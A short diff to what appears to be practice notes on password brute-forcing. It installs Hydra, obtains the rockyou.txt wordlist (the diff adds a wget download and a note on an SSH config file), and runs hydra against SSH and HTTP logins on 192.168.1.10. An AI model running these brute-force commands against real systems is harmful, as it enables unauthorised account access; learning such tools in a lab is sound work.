@@ -3,6 +3,11 @@ sudo apt update
 sudo apt install hydra -y
 sudo apt install wordlists -y
 sudo gzip -d /usr/share/wordlists/rockyou.txt.gz
+
+(note /etc/ssh/sshd_config.d$ sudo vi 60-cloudimg-settings.conf )
+or
+
+wget https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt
   
 hydra -l user -P passwords.txt ssh://192.168.1.10
 hydra -l admin -P passwords.txt http-get://192.168.1.10
